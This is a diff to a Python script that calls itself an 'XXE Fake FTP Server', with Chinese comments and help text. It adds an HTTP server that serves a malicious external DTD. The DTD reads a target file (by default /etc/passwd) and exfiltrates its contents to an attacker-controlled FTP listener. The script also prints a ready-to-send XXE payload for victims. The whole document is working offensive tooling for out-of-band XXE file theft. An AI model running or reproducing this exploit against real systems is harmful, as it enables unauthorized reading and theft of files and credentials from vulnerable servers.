@@ -2,6 +2,9 @@ import socket
 import threading
 import sys
 import time
+import argparse
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import logging
 
 # === 配置部分 ===
 BANNER = b'220 (vsFTPd 3.0.3)\r\n'
@@ -18,6 +21,56 @@ def get_host_ip():
     finally:
         s.close()
     return ip
+
+
+class DTDHandler(BaseHTTPRequestHandler):
+    """HTTP handler for serving dynamic data.dtd"""
+    
+    public_ip = None
+    ftp_port = None
+    file_path = None
+    
+    def do_GET(self):
+        """处理 GET 请求，返回动态生成的 DTD payload"""
+        self.send_response(200)
+        self.send_header('Content-type', 'application/xml-dtd')
+        self.end_headers()
+        
+        # 构造 DTD payload
+        # 确保文件路径格式正确 (file:/// + path)
+        # 只移除开头的单个 /，保留 UNC 路径 (//server/share)
+        file_path = self.file_path[1:] if self.file_path.startswith('/') else self.file_path
+        dtd_content = f'''<!ENTITY % file SYSTEM "file:///{file_path}">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{self.public_ip}:{self.ftp_port}/%file;'>">
+%eval;
+%exfil;
+'''
+        
+        self.wfile.write(dtd_content.encode())
+        
+        # 记录请求
+        logging.info(f"[HTTP] Request from {self.address_string()} - Path: {self.path}")
+        logging.info(f"[HTTP] Sent DTD payload for file: {self.file_path}")
+    
+    def log_message(self, format, *args):
+        """自定义日志格式"""
+        logging.info(f"[HTTP] {self.address_string()} - {format % args}")
+
+
+def start_http_server(port, public_ip, ftp_port, file_path):
+    """启动 HTTP 服务器用于提供 data.dtd
+    
+    Note: Class attributes are set once before serve_forever() and remain 
+    read-only during serving, so thread safety is not a concern here.
+    """
+    DTDHandler.public_ip = public_ip
+    DTDHandler.ftp_port = ftp_port
+    DTDHandler.file_path = file_path
+    
+    server = HTTPServer(('0.0.0.0', port), DTDHandler)
+    logging.info(f"[*] HTTP Server started on port {port}")
+    logging.info(f"[*] DTD Payload URL: http://{public_ip}:{port}/data.dtd")
+    server.serve_forever()
 
 def pasv_connection_handler(pasv_socket):
     """
@@ -161,14 +214,52 @@ def handle_client(conn, addr, output_file=None):
                 print(f"[-] Write file error: {e}")
 
 if __name__ == '__main__':
-    if len(sys.argv) < 2:
-        print(f"Usage: python {sys.argv[0]} <port> [output_file]")
-        print(f"Example: python {sys.argv[0]} 2121 data.log")
-        sys.exit(1)
-
+    # 解析命令行参数
+    parser = argparse.ArgumentParser(
+        description='XXE Fake FTP Server - 结合 HTTP 和 FTP 服务器用于 XXE 漏洞利用',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+示例:
+  %(prog)s 2121                           # 仅启动 FTP 服务器，端口 2121
+  %(prog)s 2121 --http-port 8000          # 启动 FTP(2121) 和 HTTP(8000) 服务器
+  %(prog)s 2121 -w 8000 -f /etc/passwd    # 指定默认读取文件
+  %(prog)s 2121 -w 8000 -o data.log       # 保存捕获数据到文件
+  %(prog)s 2121 -w 8000 --ip 192.168.1.1  # 指定公网 IP
+        ''')
+    
+    parser.add_argument('port', 
+                        type=int,
+                        help='FTP 服务器监听端口')
+    parser.add_argument('-o', '--output',
+                        dest='output_file',
+                        help='捕获数据输出文件')
+    parser.add_argument('-w', '--http-port',
+                        type=int,
+                        dest='http_port',
+                        help='HTTP 服务器端口 (用于提供 data.dtd)')
+    parser.add_argument('--ip',
+                        dest='public_ip',
+                        help='公网 IP 地址 (默认自动检测)')
+    parser.add_argument('-f', '--file',
+                        dest='file_path',
+                        default='/etc/passwd',
+                        help='要读取的目标文件路径 (默认: /etc/passwd)')
+    
+    args = parser.parse_args()
+    
+    # PUBLIC_IP 用于 payload 和响应生成 (显示给外部使用)
+    PUBLIC_IP = args.public_ip if args.public_ip else get_host_ip()
+    # IP 用于 PASV 模式绑定本地网络接口
     IP = get_host_ip()
-    PORT = int(sys.argv[1])
-    ADDR_MAIN = (IP, PORT)
+    PORT = args.port
+    ADDR_MAIN = ('0.0.0.0', PORT)  # 绑定到所有接口
+
+    # 配置日志
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s [%(levelname)s] %(message)s',
+        datefmt='%Y-%m-%d %H:%M:%S'
+    )
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -176,15 +267,43 @@ if __name__ == '__main__':
     try:
         server.bind(ADDR_MAIN)
         server.listen(10)
-        print(f"[*] XXE Fake FTP Server listening on {IP}:{PORT}")
-        if len(sys.argv) > 2:
-            print(f"[*] Logging captured data to: {sys.argv[2]}")
+        print(f"[*] XXE Fake FTP Server listening on 0.0.0.0:{PORT} (Public IP: {PUBLIC_IP})")
+        if args.output_file:
+            print(f"[*] Logging captured data to: {args.output_file}")
+        
+        # 启动 HTTP 服务器 (如果指定了端口)
+        if args.http_port:
+            http_thread = threading.Thread(
+                target=start_http_server,
+                args=(args.http_port, PUBLIC_IP, PORT, args.file_path),
+                daemon=True
+            )
+            http_thread.start()
+            
+            # 打印 XXE payload 使用说明
+            xxe_payload = f'''
+[*] XXE Payload Usage:
+===============================================================
+请发送如下 XXE payload 到目标服务器:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://{PUBLIC_IP}:{args.http_port}/data.dtd">
+  %xxe;
+]>
+
+DTD URL: http://{PUBLIC_IP}:{args.http_port}/data.dtd
+目标文件: {args.file_path}
+FTP 回连地址: ftp://{PUBLIC_IP}:{PORT}
+===============================================================
+'''
+            print(xxe_payload)
 
         while True:
             conn, addr = server.accept()
             client_thread = threading.Thread(
                 target=handle_client,
-                args=(conn, addr, sys.argv[2] if len(sys.argv) > 2 else None)
+                args=(conn, addr, args.output_file)
             )
             client_thread.daemon = True
             client_thread.start()
